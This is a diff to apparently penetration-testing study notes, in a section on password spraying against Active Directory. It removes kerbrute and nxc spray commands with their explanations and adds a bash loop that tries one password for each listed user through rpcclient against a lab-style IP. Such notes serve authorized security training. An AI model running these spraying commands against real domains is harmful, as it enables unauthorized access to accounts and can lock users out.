@@ -85,14 +85,7 @@ Establish an anonymous SMB NULL session from a Windows host. Used as a prerequis
 ---
 ## Password Spraying
 
+**Linux:**
 ```
-kerbrute passwordspray -d <domain> --dc <dc-ip> <valid-users-file> <password>
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
 ```
-
-Spray a single password against a validated user list via Kerberos. Generates less noise than SMB-based spraying. `-d` specifies the domain, `--dc` specifies the domain controller IP.
-
-```
-sudo nxc smb <dc-ip> -u <valid-users-file> -p <password> | grep +
-```
-
-Spray via SMB from a Linux host. `grep +` filters output to successful authentications only.
